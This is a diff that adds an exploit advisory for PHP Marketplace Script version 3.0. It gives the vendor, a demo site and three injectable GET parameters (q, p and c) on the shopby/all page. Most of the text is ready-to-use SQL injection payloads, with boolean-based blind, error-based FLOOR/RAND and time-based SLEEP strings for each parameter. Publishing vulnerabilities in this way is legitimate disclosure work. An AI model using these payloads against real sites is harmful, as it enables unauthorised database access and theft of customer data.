@@ -1,0 +1,60 @@
+# Exploit Title :  PHP Marketplace Script - Multiple SQL Injection Vulnerabilities
+# Author 		:  Yunus YILDIRIM (Th3GundY)
+# Team 			:  CT-Zer0 (@CRYPTTECH) - https://www.crypttech.com
+# Website 		:  http://www.yunus.ninja
+# Contact 		:  yunusyildirim@protonmail.com
+
+# Vendor Homepage 	: http://www.ecommercemix.com/
+# Software Link  	: http://ecommercemix.com/php-marketplace-script/
+# Vuln. Version	  	: 3.0
+# Demo				: http://pleasureriver.com
+
+
+# # # #  DETAILS  # # # # 
+
+SQL Injections :
+
+# 1
+http://localhost/shopby/all?q=gundy
+	Parameter: q (GET)
+	    Type: boolean-based blind
+	    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment) (NOT)
+	    Payload: q=LIEQ") OR NOT 5305=5305#
+
+	    Type: error-based
+	    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+	    Payload: q=LIEQ") AND (SELECT 7200 FROM(SELECT COUNT(*),CONCAT(0x7170767871,(SELECT (ELT(7200=7200,1))),0x7176766271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND ("SRxl"="SRxl
+
+	    Type: AND/OR time-based blind
+	    Title: MySQL >= 5.0.12 OR time-based blind (comment)
+	    Payload: q=LIEQ") OR SLEEP(5)#
+
+# 2
+http://localhost/shopby/all?p=31
+	Parameter: p (GET)
+	    Type: boolean-based blind
+	    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment) (NOT)
+	    Payload: p=31") OR NOT 6681=6681#
+
+	    Type: error-based
+	    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+	    Payload: p=31") AND (SELECT 4760 FROM(SELECT COUNT(*),CONCAT(0x7170767871,(SELECT (ELT(4760=4760,1))),0x7176766271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND ("eFds"="eFds
+
+	    Type: AND/OR time-based blind
+	    Title: MySQL >= 5.0.12 AND time-based blind
+	    Payload: p=31") AND SLEEP(5) AND ("kxQU"="kxQU
+
+# 3
+http://localhost/shopby/all?c=Turkey
+	Parameter: c (GET)
+	    Type: boolean-based blind
+	    Title: AND boolean-based blind - WHERE or HAVING clause
+	    Payload: c=Turkey' AND 9145=9145 AND 'tvKB'='tvKB
+
+	    Type: error-based
+	    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+	    Payload: c=Turkey' AND (SELECT 5928 FROM(SELECT COUNT(*),CONCAT(0x7176767071,(SELECT (ELT(5928=5928,1))),0x717a6b6271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'APFD'='APFD
+
+	    Type: AND/OR time-based blind
+	    Title: MySQL >= 5.0.12 AND time-based blind
+	    Payload: c=Turkey' AND SLEEP(5) AND 'rmia'='rmia
